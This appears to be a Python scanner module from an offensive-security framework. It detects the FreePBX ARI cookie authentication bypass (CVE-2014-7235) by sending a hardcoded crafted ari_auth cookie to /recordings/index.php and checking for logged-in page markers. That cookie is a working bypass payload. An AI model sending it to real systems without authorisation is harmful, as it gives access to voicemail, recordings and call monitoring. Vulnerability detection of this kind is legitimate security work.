#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FreePBX ARI recordings auth bypass (CVE-2014-7235)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FreePBX ARI - Cookie Auth Bypass Detection (CVE-2014-7235)',
        'description': (
            'Detects CVE-2014-7235 by sending crafted ari_auth cookie to '
            '/recordings/index.php and matching authenticated UI markers.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2014', 'freepbx', 'auth-bypass', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-7235',
        ],
        'cve': 'CVE-2014-7235',
    }

    COOKIE = (
        'ari_auth=a%3A2%3A%7Bi%3A0%3Bs%3A88%3A%22rT9bcNlEJv%2F1G9j9ZcqPUej1nt'
        'SHDwlDvrv1pphLMel2lppX43z4E%2BF2Yc3In070LIWRFCh1wanriTUnYC8%2F%2Bg%3D'
        '%3D%22%3Bi%3A1%3Bs%3A32%3A%224ffe329af509978387ac4af2fbb3a694%22%3B%7D'
    )

    def run(self):
        r = self.http_request(
            method='GET',
            path='/recordings/index.php',
            headers={'Cookie': self.COOKIE},
            allow_redirects=False,
        )
        if not r:
            return False
        body = r.text or ''
        if '>Logout<' in body and '>Call Monitor<' in body and '>Voicemail<' in body:
            self.set_info(
                severity='critical',
                reason='FreePBX ARI auth bypass (CVE-2014-7235)',
                path='/recordings/index.php',
            )
            return True
        return False
